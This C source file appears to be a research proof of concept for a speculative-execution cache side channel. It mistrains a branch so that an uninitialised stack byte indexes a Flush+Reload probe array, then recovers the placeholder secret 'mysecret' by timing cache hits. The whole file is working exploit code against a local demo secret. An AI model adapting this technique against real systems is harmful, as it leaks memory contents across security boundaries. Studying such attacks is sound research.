#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 5
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define SECRET_SIZE 8
#define N_TRAINING 10
#define SECRET "mysecret"
#define false 0
#define true  1
#define DBG 0
#define MALLOC_SIZE 4096

#define ALIGNED_SIZE 4096

cp_t* flush_reload_arr;
volatile cp_t cp;   //cache page declared out of function to keep stack identical to init_func()
int __attribute__((aligned(ALIGNED_SIZE))) init_cp;

__attribute__((noinline)) void init_func(int val) {
    //cp = flush_reload_arr[91];
    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x = val;
    printf("init  \t%p:\t%d\n", &x, x);
}

__attribute__((noinline)) void uninit_func() {
    //cp = flush_reload_arr[01];
    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x;
    cp = flush_reload_arr[x];
    printf("uninit\t%p:\t%d\n", &x, x);
}

//static inline void victim_func(char init) {
__attribute__((noinline)) void victim_func(char init) {
    int val = 5;
    init_cp = init;

    //flush((void*)&val);
    flush((void*)&init_cp);
    cpuid();

    if(init_cp) {
        //cp = flush_reload_arr[90];
        init_func(val);
    }
    else {
        //cp = flush_reload_arr[00];
        uninit_func();
    }

}

void touch_secret(int secret_index) {
    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) s = SECRET[secret_index];
    printf("secret\t%p:\t%d\n", &s, s);
}

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr((void*)flush_reload_arr, N_PAGES);
    cpuid();

    int n_accesses = N_TRAINING + 1;
    char init_bools[n_accesses];
    for(int i = 0; i < n_accesses; i++) init_bools[i] = false;
    init_bools[n_accesses-1] = true;

    for(int i = 0; i < n_accesses; i++) {
        touch_secret(secret_index);
        victim_func(init_bools[i]);
        cpuid();
        if(init_bools[i] == false) {
            cpuid();
            flush_arr((void*)flush_reload_arr, N_PAGES);
        }
        cpuid();

    }

    cpuid();
    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    srand(time(0));
    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);


}